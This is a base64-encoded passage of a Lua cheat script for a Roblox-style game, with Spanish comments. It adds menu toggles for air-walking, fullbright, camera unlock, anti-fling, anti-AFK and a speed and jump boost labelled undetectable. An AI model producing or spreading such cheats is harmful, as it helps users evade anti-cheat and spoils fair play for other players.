UN1cnJlbnRWYWx1ZSA9IGZhbHNlLAoJRmxhZyA9ICJTaGlmdGxvY2tUb2dnbGUiLAoJQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKCQlzaGlmdGxvY2tFbmFibGVkID0gVmFsdWUKCQlCdXR0b24uVmlzaWJsZSA9IHNoaWZ0bG9ja0VuYWJsZWQgYW5kIFVzZXJJbnB1dFNlcnZpY2UuVG91Y2hFbmFibGVkCgkJaWYgbm90IHNoaWZ0bG9ja0VuYWJsZWQgYW5kIGlzQWN0aXZlIHRoZW4KCQkJaXNBY3RpdmUgPSBmYWxzZQoJCQlVcGRhdGVBdXRvUm90YXRlKHRydWUpCgkJCVVwZGF0ZUltYWdlKCJPRkYiKQoJCQlDcm9zc2hhaXIuVmlzaWJsZSA9IGZhbHNlCgkJCVVzZXJJbnB1dFNlcnZpY2UuTW91c2VJY29uRW5hYmxlZCA9IHRydWUKCQkJVXNlcklucHV0U2VydmljZS5Nb3VzZUJlaGF2aW9yID0gRW51bS5Nb3VzZUJlaGF2aW9yLkRlZmF1bHQKCQkJaWYgY2FtZXJhQ29ubmVjdGlvbiB0aGVuCgkJCQljYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJCQkJY2FtZXJhQ29ubmVjdGlvbiA9IG5pbAoJCQllbmQKCQllbmQKCWVuZAp9KQoKLS0gQ2FtaW5hciBlbiBlbCBhaXJlCmxvY2FsIGlzV2Fsa2luZ0luQWlyID0gZmFsc2UKbG9jYWwgZmxvb3JQYXJ0ID0gbmlsCmxvY2FsIGhlYXJ0YmVhdENvbm5lY3Rpb24gPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGlzVG91Y2hpbmdHcm91bmQoKQoJbG9jYWwgcmF5ID0gUmF5Lm5ldyhyb290LlBvc2l0aW9uLCBWZWN0b3IzLm5ldygwLCAtNSwgMCkpCglsb2NhbCBoaXRQYXJ0ID0gd29ya3NwYWNlOkZpbmRQYXJ0T25SYXkocmF5LCBjaGFyYWN0ZXIpCglyZXR1cm4gaGl0UGFydCBhbmQgaGl0UGFydC5DYW5Db2xsaWRlCmVuZAoKbG9jYWwgZnVuY3Rpb24gY3JlYXRlRmxvb3IoKQoJaWYgbm90IGZsb29yUGFydCB0aGVuCgkJZmxvb3JQYXJ0ID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKCQlmbG9vclBhcnQuU2l6ZSA9IFZlY3RvcjMubmV3KDUwLCAxLCA1MCkKCQlmbG9vclBhcnQuQW5jaG9yZWQgPSB0cnVlCgkJZmxvb3JQYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCgkJZmxvb3JQYXJ0LlRyYW5zcGFyZW5jeSA9IDEKCQlmbG9vclBhcnQuUGFyZW50ID0gd29ya3NwYWNlCgllbmQKZW5kCgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkNhbWluYXIgZW4gZWwgYWlyZSIsCglDdXJyZW50VmFsdWUgPSBpc1dhbGtpbmdJbkFpciwKCUZsYWcgPSAid2Fsa0luQWlyVG9nZ2xlIiwKCUNhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCgkJaXNXYWxraW5nSW5BaXIgPSBWYWx1ZQoKCQlpZiBpc1dhbGtpbmdJbkFpciB0aGVuCgkJCWNyZWF0ZUZsb29yKCkKCQkJaWYgbm90IGhlYXJ0YmVhdENvbm5lY3Rpb24gdGhlbgoJCQkJaGVhcnRiZWF0Q29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJCWlmIGlzV2Fsa2luZ0luQWlyIGFuZCBmbG9vclBhcnQgYW5kIG5vdCBpc1RvdWNoaW5nR3JvdW5kKCkgdGhlbgoJCQkJCQlmbG9vclBhcnQuUG9zaXRpb24gPSByb290LlBvc2l0aW9uIC0gVmVjdG9yMy5uZXcoMCwgMywgMCkKCQkJCQllbmQKCQkJCWVuZCkKCQkJZW5kCgkJZWxzZQoJCQlpZiBmbG9vclBhcnQgdGhlbgoJCQkJZmxvb3JQYXJ0OkRlc3Ryb3koKQoJCQkJZmxvb3JQYXJ0ID0gbmlsCgkJCWVuZAoJCQlpZiBoZWFydGJlYXRDb25uZWN0aW9uIHRoZW4KCQkJCWhlYXJ0YmVhdENvbm5lY3Rpb246RGlzY29ubmVjdCgpCgkJCQloZWFydGJlYXRDb25uZWN0aW9uID0gbmlsCgkJCWVuZAoJCWVuZAoJZW5kLAp9KQoKLS0gTXV0ZWFyIHNvbmlkb3MgZXhjZXB0byB2b3oKbG9jYWwgbXV0ZWRTb3VuZHMgPSB7fQpsb2NhbCB0b2dnbGVBY3RpdmUgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gaXNWb2ljZVNvdW5kKHNvdW5kKQoJaWYgc291bmQ6SXNEZXNjZW5kYW50T2YoVm9pY2VDaGF0U2VydmljZSkgdGhlbiByZXR1cm4gdHJ1ZSBlbmQKCWxvY2FsIG5hbWUgPSBzb3VuZC5OYW1lOmxvd2VyKCkKCXJldHVybiBuYW1lOmZpbmQoInZvaWNlIikgb3IgbmFtZTpmaW5kKCJ2YyIpCmVuZAoKbG9jYWwgZnVuY3Rpb24gbXV0ZUFsbEV4Y2VwdFZvaWNlKCkKCWZvciBfLCBzb3VuZCBpbiBpcGFpcnMoZ2FtZTpHZXREZXNjZW5kYW50cygpKSBkbwoJCWlmIHNvdW5kOklzQSgiU291bmQiKSBhbmQgbm90IGlzVm9pY2VTb3VuZChzb3VuZCkgdGhlbgoJCQlpZiBzb3VuZC5QbGF5aW5nIGFuZCBzb3VuZC5Wb2x1bWUgPiAwIHRoZW4KCQkJCW11dGVkU291bmRzW3NvdW5kXSA9IHNvdW5kLlZvbHVtZQoJCQkJc291bmQuVm9sdW1lID0gMAoJCQllbmQKCQllbmQKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHVubXV0ZUFsbCgpCglmb3Igc291bmQsIHZvbCBpbiBwYWlycyhtdXRlZFNvdW5kcykgZG8KCQlpZiBzb3VuZCBhbmQgc291bmQuUGFyZW50IHRoZW4KCQkJc291bmQuVm9sdW1lID0gdm9sCgkJZW5kCgllbmQKCW11dGVkU291bmRzID0ge30KZW5kCgpnYW1lLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHNvdW5kKQoJaWYgdG9nZ2xlQWN0aXZlIGFuZCBzb3VuZDpJc0EoIlNvdW5kIikgYW5kIG5vdCBpc1ZvaWNlU291bmQoc291bmQpIHRoZW4KCQltdXRlZFNvdW5kc1tzb3VuZF0gPSBzb3VuZC5Wb2x1bWUKCQlzb3VuZC5Wb2x1bWUgPSAwCgllbmQKZW5kKQoKTWFpblRhYjpDcmVhdGVUb2dnbGUoewoJTmFtZSA9ICJNdXRlYXIgc29uaWRvcyAodm96IG5vKSIsCglDdXJyZW50VmFsdWUgPSBmYWxzZSwKCUZsYWcgPSAiTXV0ZUF1ZGlvcyIsCglDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQoJCXRvZ2dsZUFjdGl2ZSA9IFZhbHVlCgkJaWYgVmFsdWUgdGhlbgoJCQltdXRlQWxsRXhjZXB0Vm9pY2UoKQoJCWVsc2UKCQkJdW5tdXRlQWxsKCkKCQllbmQKCWVuZAp9KQoKCgoKLS0tRnVsbGJyaWdodAoKbG9jYWwgTGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIG9yaWdpbmFsU2V0dGluZ3MgPSB7fQpsb2NhbCBjb25uZWN0aW9uCgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkZ1bGxicmlnaHQiLAoJRmxhZyA9ICJGdWxsYnJpZ2h0IiwKCUN1cnJlbnRWYWx1ZSA9IGZhbHNlLAoJQ2FsbGJhY2sgPSBmdW5jdGlvbihlbmFibGVkKQoJCWlmIGVuYWJsZWQgdGhlbgoJCQktLSBHdWFyZGFyIHZhbG9yZXMgb3JpZ2luYWxlcwoJCQlvcmlnaW5hbFNldHRpbmdzLkJyaWdodG5lc3MgPSBMaWdodGluZy5CcmlnaHRuZXNzCgkJCW9yaWdpbmFsU2V0dGluZ3MuQ2xvY2tUaW1lID0gTGlnaHRpbmcuQ2xvY2tUaW1lCgkJCW9yaWdpbmFsU2V0dGluZ3MuQW1iaWVudCA9IExpZ2h0aW5nLkFtYmllbnQKCQkJb3JpZ2luYWxTZXR0aW5ncy5PdXRkb29yQW1iaWVudCA9IExpZ2h0aW5nLk91dGRvb3JBbWJpZW50CgkJCW9yaWdpbmFsU2V0dGluZ3MuR2xvYmFsU2hhZG93cyA9IExpZ2h0aW5nLkdsb2JhbFNoYWRvd3MKCgkJCS0tIENvbmV4acOzbiBwYXJhIGZvcnphciBpbHVtaW5hY2nDs24KCQkJaWYgbm90IGNvbm5lY3Rpb24gdGhlbgoJCQkJY29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCQlMaWdodGluZy5CcmlnaHRuZXNzID0gMS41CgkJCQkJTGlnaHRpbmcuQ2xvY2tUaW1lID0gMTIKCQkJCQlMaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJCQkJCUxpZ2h0aW5nLk91dGRvb3JBbWJpZW50ID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJCQkJCUxpZ2h0aW5nLkdsb2JhbFNoYWRvd3MgPSBmYWxzZQoJCQkJZW5kKQoJCQllbmQKCQllbHNlCgkJCS0tIFJlc3RhdXJhciB2YWxvcmVzCgkJCWlmIGNvbm5lY3Rpb24gdGhlbgoJCQkJY29ubmVjdGlvbjpEaXNjb25uZWN0KCkKCQkJCWNvbm5lY3Rpb24gPSBuaWwKCQkJZW5kCgkJCWZvciBwcm9wLCB2YWx1ZSBpbiBwYWlycyhvcmlnaW5hbFNldHRpbmdzKSBkbwoJCQkJTGlnaHRpbmdbcHJvcF0gPSB2YWx1ZQoJCQllbmQKCQllbmQKCWVuZAp9KQoKCgoKCi0tIFNlcnZpY2lvcyB5IHZhcmlhYmxlcyBuZWNlc2FyaWFzCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIENhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgpsb2NhbCB1bmxvY2tDYW1lcmFDb25uZWN0aW9uCmxvY2FsIGNhbWVyYVVubG9ja2VkID0gZmFsc2UgLS0gSU5JQ0lBTE1FTlRFIEZBTFNPCmxvY2FsIG9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MgPSB7fQoKLS0gRnVuY2nDs24gcGFyYSBmb3J6YXIgZWwgY29udHJvbCBkZSBjw6FtYXJhCmxvY2FsIGZ1bmN0aW9uIGVuYWJsZUNhbWVyYUNvbnRyb2woKQoJbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQoJbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCgoJLS0gR3VhcmRhciBlc3RhZG8gb3JpZ2luYWwgdW5hIHNvbGEgdmV6CglpZiBub3Qgb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5zYXZlZCB0aGVuCgkJb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5DYW1lcmFUeXBlID0gQ2FtZXJhLkNhbWVyYVR5cGUKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLkNhbWVyYVN1YmplY3QgPSBDYW1lcmEuQ2FtZXJhU3ViamVjdAoJCW9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MuQ2FtZXJhTW9kZSA9IExvY2FsUGxheWVyLkNhbWVyYU1vZGUKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLk1heFpvb20gPSBMb2NhbFBsYXllci5DYW1lcmFNYXhab29tRGlzdGFuY2UKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLk1pblpvb20gPSBMb2NhbFBsYXllci5DYW1lcmFNaW5ab29tRGlzdGFuY2UKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLnNhdmVkID0gdHJ1ZQoJZW5kCgoJLS0gRGVzY29uZWN0YXIgc2kgeWEgaGFiw61hIHVuYSBjb25leGnDs24gcHJldmlhCglpZiB1bmxvY2tDYW1lcmFDb25uZWN0aW9uIHRoZW4KCQl1bmxvY2tDYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJZW5kCgoJdW5sb2NrQ2FtZXJhQ29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiBub3QgY2FtZXJhVW5sb2NrZWQgdGhlbiByZXR1cm4gZW5kCgoJCWlmIENhbWVyYS5DYW1lcmFUeXBlIH49IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20gdGhlbgoJCQlDYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20KCQllbmQKCgkJaWYgQ2FtZXJhLkNhbWVyYVN1YmplY3Qgfj0gaHVtYW5vaWQgdGhlbgoJCQlDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCgkJZW5kCgoJCUxvY2FsUGxheWVyLkNhbWVyYU1vZGUgPSBFbnVtLkNhbWVyYU1vZGUuQ2xhc3NpYwoJCUxvY2FsUGxheWVyLkNhbWVyYU1heFpvb21EaXN0YW5jZSA9IDEyOAoJCUxvY2FsUGxheWVyLkNhbWVyYU1pblpvb21EaXN0YW5jZSA9IDAuNQoJZW5kKQplbmQKCi0tIFRPR0dMRTogVW5sb2NrIENhbWVyYQpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkRlc2Jsb3F1ZWFyIENhbWFyYSIsCglGbGFnID0gInVubG9ja0NhbSIsCglDdXJyZW50VmFsdWUgPSBmYWxzZSwKCUNhbGxiYWNrID0gZnVuY3Rpb24oZW5hYmxlZCkKCQljYW1lcmFVbmxvY2tlZCA9IGVuYWJsZWQKCgkJaWYgZW5hYmxlZCB0aGVuCgkJCWVuYWJsZUNhbWVyYUNvbnRyb2woKQoJCWVsc2UKCQkJLS0gRGVzY29uZWN0YXIgcmVuZGVyIGxvb3AKCQkJaWYgdW5sb2NrQ2FtZXJhQ29ubmVjdGlvbiB0aGVuCgkJCQl1bmxvY2tDYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJCQkJdW5sb2NrQ2FtZXJhQ29ubmVjdGlvbiA9IG5pbAoJCQllbmQKCgkJCS0tIFJlc3RhdXJhciB2YWxvcmVzIG9yaWdpbmFsZXMgc2kgZXN0YWJhbiBndWFyZGFkb3MKCQkJaWYgb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5zYXZlZCB0aGVuCgkJCQlDYW1lcmEuQ2FtZXJhVHlwZSA9IG9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MuQ2FtZXJhVHlwZQoJCQkJQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBvcmlnaW5hbENhbWVyYVNldHRpbmdzLkNhbWVyYVN1YmplY3QKCQkJCUxvY2FsUGxheWVyLkNhbWVyYU1vZGUgPSBvcmlnaW5hbENhbWVyYVNldHRpbmdzLkNhbWVyYU1vZGUKCQkJCUxvY2FsUGxheWVyLkNhbWVyYU1heFpvb21EaXN0YW5jZSA9IG9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MuTWF4Wm9vbQoJCQkJTG9jYWxQbGF5ZXIuQ2FtZXJhTWluWm9vbURpc3RhbmNlID0gb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5NaW5ab29tCgkJCWVuZAoJCWVuZAoJZW5kCn0pCgotLSBFamVjdXRhciBlbmFibGVDYW1lcmFDb250cm9sKCkgc29sbyBzaSBlbCB0b2dnbGUgZXN0w6EgYWN0aXZhZG8gYWwgY2FyZ2FyIChvcGNpb25hbCkKaWYgY2FtZXJhVW5sb2NrZWQgdGhlbgoJZW5hYmxlQ2FtZXJhQ29udHJvbCgpCmVuZAoKLS0gUmVhcGxpY2FyIHNpIHJlYXBhcmVjZSBlbCBwZXJzb25hamUsIHBlcm8gc29sbyBzaSBlc3TDoSBhY3RpdmFkbwpMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCWlmIGNhbWVyYVVubG9ja2VkIHRoZW4KCQllbmFibGVDYW1lcmFDb250cm9sKCkKCWVuZAplbmQpCgoKCgoKCgoKCgoKLS0gQXNlZ8O6cmF0ZSBkZSBxdWUgZXN0YXMgdmFyaWFibGVzIGVzdMOhbiBkZWZpbmlkYXMKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKLS0gVmFyaWFibGVzIGRlIGNvbnRyb2wKbG9jYWwgYm9vc3RFbmFibGVkID0gZmFsc2UKbG9jYWwgYm9vc3RTdHJlbmd0aCA9IDEwMApsb2NhbCBiYXNlV2Fsa1NwZWVkID0gMTYKbG9jYWwgYmFzZUp1bXBQb3dlciA9IDUwCmxvY2FsIG9yaWdpbmFsU3RhdHMgPSB7fQoKLS0gRnVuY2nDs24gcGFyYSBhcGxpY2FyIGJvb3N0CmxvY2FsIGZ1bmN0aW9uIGFwcGx5Qm9vc3QoKQoJbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQoJbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiSHVtYW5vaWQiKQoJaWYgaHVtYW5vaWQgdGhlbgoJCS0tIEd1YXJkYXIgdmFsb3JlcyBvcmlnaW5hbGVzIHVuYSB2ZXoKCQlpZiBub3Qgb3JpZ2luYWxTdGF0cy5zYXZlZCB0aGVuCgkJCW9yaWdpbmFsU3RhdHMuV2Fsa1NwZWVkID0gaHVtYW5vaWQuV2Fsa1NwZWVkCgkJCW9yaWdpbmFsU3RhdHMuSnVtcFBvd2VyID0gaHVtYW5vaWQuSnVtcFBvd2VyCgkJCW9yaWdpbmFsU3RhdHMuc2F2ZWQgPSB0cnVlCgkJZW5kCgoJCWh1bWFub2lkLlVzZUp1bXBQb3dlciA9IHRydWUKCQlsb2NhbCBzcGVlZE11bHRpcGxpZXIgPSAoYm9vc3RTdHJlbmd0aCAqIDAuMSkgLyAxMDAKCQlsb2NhbCBqdW1wTXVsdGlwbGllciA9IChib29zdFN0cmVuZ3RoICogMC40KSAvIDEwMAoJCWh1bWFub2lkLldhbGtTcGVlZCA9IGJhc2VXYWxrU3BlZWQgKiAoMSArIHNwZWVkTXVsdGlwbGllcikKCQlodW1hbm9pZC5KdW1wUG93ZXIgPSBiYXNlSnVtcFBvd2VyICogKDEgKyBqdW1wTXVsdGlwbGllcikKCWVuZAplbmQKCi0tIFJlc3RhdXJhciB2YWxvcmVzIG9yaWdpbmFsZXMKbG9jYWwgZnVuY3Rpb24gcmVzdG9yZVN0YXRzKCkKCWxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKCWxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKCWlmIGh1bWFub2lkIGFuZCBvcmlnaW5hbFN0YXRzLnNhdmVkIHRoZW4KCQlodW1hbm9pZC5XYWxrU3BlZWQgPSBvcmlnaW5hbFN0YXRzLldhbGtTcGVlZAoJCWh1bWFub2lkLkp1bXBQb3dlciA9IG9yaWdpbmFsU3RhdHMuSnVtcFBvd2VyCgllbmQKZW5kCgotLSBUb2dnbGUgZW4gTWFpblRhYgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIlNhbHRvIHkgVmVsb2NpZGFkIEluZGV0ZWN0YWJsZSIsCglGbGFnID0gIm1vdmVtZW50Qm9vc3QiLAoJQ3VycmVudFZhbHVlID0gZmFsc2UsCglDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQoJCWJvb3N0RW5hYmxlZCA9IHZhbHVlCgkJaWYgYm9vc3RFbmFibGVkIHRoZW4KCQkJYXBwbHlCb29zdCgpCgkJZWxzZQoJCQlyZXN0b3JlU3RhdHMoKQoJCWVuZAoJZW5kCn0pCgotLSBTbGlkZXIgZW4gTWFpblRhYgpNYWluVGFiOkNyZWF0ZVNsaWRlcih7CglOYW1lID0gIkF1bWVudG8gVmVsb2NpZGFkIEluZGV0ZWN0YWJsZSIsCglGbGFnID0gImJvb3N0U3RyZW5ndGgiLAoJUmFuZ2UgPSB7MCwgMTAwfSwKCUluY3JlbWVudCA9IDUsCglDdXJyZW50VmFsdWUgPSBib29zdFN0cmVuZ3RoLAoJU3VmZml4ID0gIisiLAoJQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKCQlib29zdFN0cmVuZ3RoID0gdmFsdWUKCQlpZiBib29zdEVuYWJsZWQgdGhlbgoJCQlhcHBseUJvb3N0KCkKCQllbmQKCWVuZAp9KQoKCgoKCgoKCi0tLS0tCgoKCgoKCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQoKbG9jYWwgYW50aUZsaW5nRW5hYmxlZCA9IGZhbHNlCmxvY2FsIGNoYXJhY3RlckNvbm5lY3Rpb25zID0ge30KbG9jYWwgY29sbGlzaW9uTG9vcAoKbG9jYWwgZnVuY3Rpb24gU2V0Tm9Db2xsaXNpb24oY2hhcmFjdGVyKQoJZm9yIF8sIGl0ZW0gaW4gcGFpcnMoY2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCgkJaWYgaXRlbTpJc0EoIkJhc2VQYXJ0IikgYW5kIGl0ZW0uQ2FuQ29sbGlkZSB0aGVuCgkJCWl0ZW0uQ2FuQ29sbGlkZSA9IGZhbHNlCgkJZW5kCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBPbkNoYXJhY3RlckFkZGVkKHBsYXllciwgY2hhcmFjdGVyKQoJaWYgbm90IGFudGlGbGluZ0VuYWJsZWQgb3IgcGxheWVyID09IExvY2FsUGxheWVyIHRoZW4gcmV0dXJuIGVuZAoJU2V0Tm9Db2xsaXNpb24oY2hhcmFjdGVyKQoKCS0tIE51ZXZhcyBwYXJ0ZXMKCWxvY2FsIGNvbm4gPSBjaGFyYWN0ZXIuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oZGVzYykKCQlpZiBkZXNjOklzQSgiQmFzZVBhcnQiKSB0aGVuCgkJCWRlc2MuQ2FuQ29sbGlkZSA9IGZhbHNlCgkJZW5kCgllbmQpCgoJY2hhcmFjdGVyQ29ubmVjdGlvbnNbcGxheWVyXSA9IGNvbm4KZW5kCgpsb2NhbCBmdW5jdGlvbiBFbmFibGVBbnRpRmxpbmcoKQoJLS0gSW5pY2lhbAoJZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KCQlpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgoJCQlpZiBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KCQkJCU9uQ2hhcmFjdGVyQWRkZWQocGxheWVyLCBwbGF5ZXIuQ2hhcmFjdGVyKQoJCQllbmQKCQkJY2hhcmFjdGVyQ29ubmVjdGlvbnNbcGxheWVyXSA9IHBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXIpCgkJCQlPbkNoYXJhY3RlckFkZGVkKHBsYXllciwgY2hhcikKCQkJZW5kKQoJCWVuZAoJZW5kCgoJLS0gTnVldm9zIGp1Z2Fkb3JlcwoJY2hhcmFjdGVyQ29ubmVjdGlvbnNbIl9QbGF5ZXJBZGRlZCJdID0gUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKCQlpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZW5kCgkJY2hhcmFjdGVyQ29ubmVjdGlvbnNbcGxheWVyXSA9IHBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXIpCgkJCU9uQ2hhcmFjdGVyQWRkZWQocGxheWVyLCBjaGFyKQoJCWVuZCkKCWVuZCkKCgktLSBMb29wIHNlZ3VybyBjYWRhIDAuMjVzIHBhcmEgbWFudGVuZXIgY29saXNpw7NuIGRlc2FjdGl2YWRhCglsb2NhbCB0aW1lciA9IDAKCWNvbGxpc2lvbkxvb3AgPSBSdW5TZXJ2aWNlLlN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihfLCBkdCkKCQl0aW1lciArPSBkdAoJCWlmIHRpbWVyID49IDAuMjUgdGhlbgoJCQl0aW1lciA9IDAKCQkJZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KCQkJCWlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCgkJCQkJU2V0Tm9Db2xsaXNpb24ocGxheWVyLkNoYXJhY3RlcikKCQkJCWVuZAoJCQllbmQKCQllbmQKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBEaXNhYmxlQW50aUZsaW5nKCkKCWZvciBfLCBjb25uIGluIHBhaXJzKGNoYXJhY3RlckNvbm5lY3Rpb25zKSBkbwoJCWlmIHR5cGVvZihjb25uKSA9PSAiUkJYU2NyaXB0Q29ubmVjdGlvbiIgdGhlbgoJCQljb25uOkRpc2Nvbm5lY3QoKQoJCWVuZAoJZW5kCgljaGFyYWN0ZXJDb25uZWN0aW9ucyA9IHt9CgoJaWYgY29sbGlzaW9uTG9vcCB0aGVuCgkJY29sbGlzaW9uTG9vcDpEaXNjb25uZWN0KCkKCQljb2xsaXNpb25Mb29wID0gbmlsCgllbmQKCgktLSBSZXN0YXVyYXIgY29saXNpw7NuCglmb3IgXywgcGxheWVyIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwoJCWlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCgkJCWZvciBfLCBwYXJ0IGluIHBhaXJzKHBsYXllci5DaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KCQkJCWlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KCQkJCQlwYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbmQKZW5kCgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkFudGktRmxpbmciLAoJQ3VycmVudFZhbHVlID0gZmFsc2UsCglDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQoJCWFudGlGbGluZ0VuYWJsZWQgPSBzdGF0ZQoJCWlmIHN0YXRlIHRoZW4KCQkJRW5hYmxlQW50aUZsaW5nKCkKCQllbHNlCgkJCURpc2FibGVBbnRpRmxpbmcoKQoJCWVuZAoJZW5kLAp9KQoKCgotLS0tLUFudGkgQUZLCgoKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQpsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKCmxvY2FsIEFudGlBZmtFbmFibGVkID0gZmFsc2UKbG9jYWwgQW50aUFma1RocmVhZAoKTWFpblRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJBbnRpLUFGSyBPUCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQW50aUFma1RvZ2dsZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIEFudGlBZmtFbmFibGVkID0gVmFsdW